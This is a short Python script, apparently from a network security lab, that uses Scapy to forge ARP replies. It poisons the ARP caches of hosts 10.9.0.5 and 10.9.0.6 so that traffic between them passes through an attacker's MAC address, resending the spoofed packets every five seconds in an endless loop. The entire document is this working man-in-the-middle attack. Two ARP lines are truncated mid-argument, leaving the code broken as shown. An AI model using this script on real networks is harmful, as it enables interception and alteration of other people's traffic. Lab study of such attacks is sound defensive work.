from scapy.all import *
from time import sleep
E1 = Ether(dst="02:42:0a:09:00:05",src="02:42:0a:09:00:69")
E2 = Ether(dst="02:42:0a:09:00:06",src="02:42:0a:09:00:69")
A1 = ARP(hwsrc="02:42:0a:09:00:69",psrc="10.9.0.6",hwdst="02:42:0a:09:00:05",pds>
A2 = ARP(hwsrc="02:42:0a:09:00:69",psrc="10.9.0.5",hwdst="02:42:0a:09:00:06",pds>
pkt1 = E1/A1
pkt2 = E2/A2
while(1):
        sleep(5)
        sendp(pkt1, verbose=False)
        sendp(pkt2,verbose=False)
